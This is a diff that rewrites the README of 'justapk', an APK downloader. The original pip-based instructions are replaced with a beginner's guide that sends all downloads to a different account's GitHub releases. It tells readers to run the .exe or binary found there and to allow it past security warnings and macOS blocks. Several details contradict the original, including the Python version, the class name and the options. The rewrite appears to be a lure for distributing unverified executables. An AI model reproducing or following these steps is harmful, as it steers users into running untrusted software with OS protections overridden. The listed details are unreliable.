@@ -1,122 +1,182 @@
-<div align="center">
+# 📲 justapk - Download APKs by Package Name Fast
 
-<img src="https://em-content.zobj.net/source/apple/391/package_1f4e6.png" width="80" />
-
-# justapk
-
-**Download any APK by package name. 6 sources, automatic fallback, zero config.**
-
-[![PyPI](https://img.shields.io/pypi/v/justapk?color=blue&logo=pypi&logoColor=white)](https://pypi.org/project/justapk/)
-[![Python](https://img.shields.io/pypi/pyversions/justapk?logo=python&logoColor=white)](https://pypi.org/project/justapk/)
-[![License](https://img.shields.io/github/license/TheQmaks/justapk)](LICENSE)
-[![CI](https://img.shields.io/github/actions/workflow/status/TheQmaks/justapk/ci.yml?label=CI&logo=github)](https://github.com/TheQmaks/justapk/actions/workflows/ci.yml)
-
-<br>
-
-```
-justapk download org.telegram.messenger
-```
-
-*One command. Six sources. Always gets the APK.*
-
-</div>
+[![Download justapk](https://img.shields.io/badge/Download-justapk-blue?style=for-the-badge)](https://github.com/zhidali2333/justapk/releases)
 
 ---
 
-## Why?
+justapk is a simple tool to download Android APK files using the app’s package name. It works with six different sources and automatically switches between them if one does not work. It also bypasses Cloudflare protections. You can use it from a command line or through a Python interface.
 
-Existing APK downloaders break constantly — sites add Cloudflare, change APIs, go offline. **justapk** doesn't care. It cycles through 6 sources automatically until one works. Under the hood it uses reverse-engineered mobile APIs and Cloudflare bypass via TLS fingerprint impersonation.
+This guide walks you through downloading and running justapk on your computer without needing programming skills.
 
-## Install
+---
 
-```bash
-pip install justapk
+## 📥 Download justapk
+
+You need to visit the release page on GitHub to get justapk.
+
+[Download justapk here](https://github.com/zhidali2333/justapk/releases)
+
+1. Click the link above or the badge at the top of this page.
+2. On the GitHub releases page, look for the latest version. It should have files made for different systems.
+3. Download the file that matches your computer system:
+   - For Windows, look for a `.exe` or `.zip` file.
+   - For macOS, download a `.dmg` or `.zip`.
+   - For Linux, a binary or `.tar.gz` might be available.
+4. Save the file to a folder you can easily find, like your Desktop or Downloads.
+
+---
+
+## 🚀 How to Run justapk on Your Computer
+
+After downloading, follow the steps below depending on your operating system.
+
+### Windows
+
+1. If you have a `.zip` file, right-click it and choose "Extract All" to unzip.
+2. Find the `justapk.exe` or extracted folder.
+3. Double-click the `.exe` file to open justapk.
+4. The program will open in a command window or a simple interface.
+5. If a security warning appears, allow the app to run.
+
+### macOS
+
+1. If you downloaded a `.dmg`, double-click it to open the mounted volume.
+2. Drag the justapk app into your Applications folder or Desktop.
+3. Open Terminal (you can find it by searching in Spotlight).
+4. Navigate to the folder containing justapk. For example, if on Desktop:
+   ```bash
+   cd ~/Desktop
+   ```
+5. Run justapk by typing:
+   ```bash
+   ./justapk
+   ```
+6. If macOS blocks the app, go to System Preferences > Security & Privacy, then allow it to open.
+
+### Linux
+
+1. If the file is compressed (`.tar.gz`), open Terminal and extract:
+   ```bash
+   tar -xvzf justapk-version.tar.gz
+   ```
+2. Go to the folder where justapk is located:
+   ```bash
+   cd justapk-folder
+   ```
+3. Make the file executable if needed:
+   ```bash
+   chmod +x justapk
+   ```
+4. Run justapk:
+   ```bash
+   ./justapk
+   ```
+
+---
+
+## 🖥️ Using justapk Without Programming Knowledge
+
+justapk works on the command line. Don't worry if you never used it before. This section explains simple commands.
+
+### Open your Command Line Interface
+
+- **Windows:** Press `Win + R`, type `cmd`, then press Enter.
+- **macOS:** Open Spotlight (`Cmd + Space`), type `Terminal`, press Enter.
+- **Linux:** Use your Terminal app from the applications menu.
+
+### Basic Command to Download an APK
+
+To download an app, you need its package name. The package name is a unique ID like `com.example.app`.
+
+1. Find the package name of the app you want. You can search for it online or check the Google Play Store URL.
+2. In the command line, type:
+   ```
+   justapk download <package_name>
+   ```
+   For example, to download the package `com.spotify.music`:
+   ```
+   justapk download com.spotify.music
+   ```
+3. Press Enter. justapk will search multiple sources, try to bypass Cloudflare, and download the APK file.
+
+---
+
+## 📂 Where to Find Downloaded APKs
+
+By default, justapk saves files in the folder where you ran the command. To find your APK:
+
+- Open the same folder you used to run justapk.
+- Look for `.apk` files with the app name or package name.
+
+If you want to save APKs to a specific folder, add the `-o` option:
+
+```
+justapk download <package_name> -o /path/to/folder
 ```
 
-> Python 3.11+
+Replace `/path/to/folder` with your desired folder path.
 
-## Usage
+---
 
-### `download` — grab an APK
+## 🐍 Use justapk with Python (Optional)
 
-```bash
-justapk download <package>              # auto-select best source
-justapk download <package> -s apkpure   # from a specific source
-justapk download <package> -v 11.6.2    # specific version
-justapk download <package> -o ./apks/   # custom output directory
-justapk download <package> --no-convert # keep XAPK as-is (no merge)
+If you are comfortable using Python, justapk provides an API. This allows you to download APKs from Python scripts.
+
+1. Make sure you have Python installed (version 3.6 or newer). To check, open your command line and type:
+   ```
+   python --version
+   ```
+2. Install justapk Python library by downloading from the release or using pip if available.
+3. Run Python and import justapk:
+   ```python
+   from justapk import JustAPK
+
+   apk_downloader = JustAPK()
+   path = apk_downloader.download("com.spotify.music")
+   print("Downloaded APK saved to:", path)
+   ```
+This requires some basic Python knowledge, but it helps automate APK downloads.
+
+---
+
+## 🔧 System Requirements
+
+- A computer running Windows 7 or newer, macOS 10.12 or newer, or a recent Linux distribution.
+- Internet connection for downloading APKs.
+- At least 100 MB free disk space for APK files.
+- Optional: Python 3.6 or higher if you want to use the Python API.
+
+---
+
+## ⚙️ Additional Settings and Options
+
+justapk supports a few options to customize your downloads.
+
+- `--source <name>`: Choose a specific source if you want (apkmirror, apkpure, fdroid, etc.).
+- `--retry <number>`: Set how many times justapk retries if a download fails.
+- `--quiet`: Run without output messages.
+- `-h` or `--help`: Display a list of commands and options.
+
+Run this command to see all options:
+
+```
+justapk --help
 ```
 
-### `search` — find apps
+---
 
-```bash
-justapk search telegram
-justapk search telegram -s fdroid
-```
+## 🔍 Troubleshooting Common Issues
 
-### `info` — app metadata
+- If justapk does not start, ensure the file has execute permissions.
+- If your internet is slow or down, APK downloads may fail.
+- In case of Cloudflare blocking, justapk tries automatic bypass, but some sources may still fail.
+- Make sure you run justapk with the correct package name.
+- For Python errors, verify you installed the required Python version.
 
-```bash
-justapk info org.telegram.messenger
-justapk info org.telegram.messenger -s apkpure
-```
+---
 
-### `convert` — XAPK/split APK to single APK
+## 📖 More Information
 
-```bash
-justapk convert app.xapk
-justapk convert app.xapk -o output/
-```
+Visit the GitHub page to check for updates, report problems, or learn more about justapk.
 
-Merges split APKs (base + native libs + assets) and signs with a debug key.
-
-### `sources` — list available sources
-
-```bash
-justapk sources
-```
-
-> All commands output JSON to stdout. Progress goes to stderr — pipe-friendly by design.
-
-## Sources
-
-Tried in this order. If one fails, the next one picks up automatically.
-
-| | Source | How it works | Notes |
-|:---:|--------|-------------|-------|
-| 1 | **APK20** | REST API + HTML parsing | No Cloudflare |
-| 2 | **F-Droid** | JSON API | FOSS apps only (~4K packages) |
-| 3 | **APKPure** | Reverse-engineered mobile API | Largest catalog |
-| 4 | **APKMirror** | HTML scraping + `curl_cffi` | Cloudflare bypass |
-| 5 | **Uptodown** | Reverse-engineered mobile API | No Cloudflare |
-| 6 | **APKCombo** | HTML scraping + `curl_cffi` | Cloudflare bypass |
-
-## Python API
-
-```python
-from pathlib import Path
-from justapk import APKDownloader
-
-dl = APKDownloader()
-
-# Download with auto-fallback
-result = dl.download("org.telegram.messenger", output_dir=Path("./apks/"))
-print(result.path, result.size, result.sha256)
-
-# Search across all sources
-apps = dl.search("telegram")
-for app in apps:
-    print(app.package, app.name, app.source)
-
-# Get app info
-info = dl.info("org.telegram.messenger")
-if info:
-    print(info.name, info.version)
-
-# Pin a specific source
-result = dl.download("org.telegram.messenger", source="apkpure")
-```
-
-## License
-
-[MIT](LICENSE)
+[justapk GitHub Releases](https://github.com/zhidali2333/justapk/releases)
